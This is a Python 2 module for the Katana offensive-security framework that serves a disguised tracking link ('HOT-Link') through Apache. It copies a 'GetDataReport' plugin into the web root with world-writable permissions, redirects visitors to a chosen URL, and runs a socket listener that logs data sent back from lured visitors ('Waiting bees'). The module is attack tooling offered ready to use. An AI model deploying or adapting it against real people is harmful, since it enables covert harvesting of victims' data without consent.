# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
from core.Function import status_cmd
from threading import Thread
import socket,select        
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="Hotspoter web, assambly with GetDataReport Plugin."
	init.CodeName           ="set/web.host"
	init.DateCreation       ="24/03/2016"      
	init.LastModification   ="22/05/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE             RQ     DESCRIPTION
		'to_url':["www.google.com" ,True ,'URL redirect'],
		'enable':["false"          ,False,'Geo Enable'],
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	printAlert(0,"Setting files                           "+status_cmd('mkdir -p '+PATCH_WWW+'r/ ; echo "<?php \$url=\'http://'+init.var['to_url']+'\';\$javascript=\''+init.var['enable']+'\';?>" > '+PATCH_WWW+'r/appconfig.php & echo '))
	printAlert(0,"Coping files to server                  "+status_cmd("cp files/getdatareport/* "+PATCH_WWW+"r/"))
	printAlert(0,"Giving privileges to files              "+status_cmd("chmod -R 777 "+PATCH_WWW+"r"))
	printAlert(0,"Starting Apache Server                  "+status_cmd("service apache2 start"))
	printAlert(0,"Starting Script Server                  "+status_cmd("sudo fuser -kuv 6464/tcp > null"))

	Space()
	printAlert(7,"HOT-Link http://127.0.0.1/r/link.php?lKsm#s92Sa")
	printAlert(0,"to stop the module press "+colors[13]+"[Ctrl+c]"+colors[0])
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind(("", 6464))
	server.listen(1)
	printAlert(6,"Waiting bees...")
	try:
		while 1:
			socket_cliente, datos_cliente = server.accept()
			printAlert(3,"beed: "+str(datos_cliente))
			hilo = Cliente(socket_cliente, datos_cliente)
			hilo.start()
	except:
		printAlert(0,"Stoping Process")
		printAlert(0,"Removing files                          "+status_cmd("rm "+PATCH_WWW+"r/link.php "+PATCH_WWW+"r/appconfig.php "+PATCH_WWW+"r/GetdataReport.Plugin.php"))
		printAlert(0,"Stoping Apache                          "+status_cmd("service apache2 stop"))
		server.close()
		Space()
		
# END CODE MODULE ############################################################################################

class Cliente(Thread):
    def __init__(self, socket_cliente, datos_cliente):
        Thread.__init__(self)
        self.socket = socket_cliente
        self.datos = datos_cliente
 
    def run(self):
    	peticion = self.socket.recv(1024)
    	print peticion
    	self.socket.close()